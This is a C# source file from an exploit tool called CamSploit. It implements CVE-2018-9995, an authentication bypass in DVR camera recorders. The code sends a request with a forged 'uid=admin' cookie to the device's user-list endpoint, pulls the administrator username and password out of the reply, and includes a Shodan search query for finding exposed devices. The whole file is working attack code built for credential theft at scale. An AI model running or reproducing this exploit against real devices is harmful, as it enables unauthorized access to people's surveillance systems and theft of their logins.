﻿using System;
using System.Net;
using System.IO;
using Newtonsoft.Json;

namespace CamSploit.CVEs
{
	public class CVE_2018_9995 :Exploit
	{
        public override Credencial Run(string url)
		{
			var request = WebRequest.CreateHttp(url + "/device.rsp?opt=user&cmd=list");
			request.Timeout = 10000;
			request.CookieContainer = new CookieContainer();
			request.CookieContainer.Add(new Cookie("uid", "admin") { Domain = new Uri(url).Host });
			request.Method = "GET";

			try
			{
				var response = (HttpWebResponse) request.GetResponse();

				string username, pass;

				using (var sr = new StreamReader(response.GetResponseStream()))
				{
					var text = sr.ReadToEnd();
					dynamic json = JsonConvert.DeserializeObject(text);
					username = json.list[0].uid;
					pass = json.list[0].pwd;
				}

				return new Credencial(username, pass);
			}
			catch(WebException)
			{
				return null;
			}
		}

		public override string ShodanSearchQuery
		{
			get { return "Server: GNU rsp/1.0"; }
		}

		public override string Description { get { return "CVE-2018-9995 description"; } }

        public override string CommonName { get { return "CVE-2018-9995"; } }
    }
}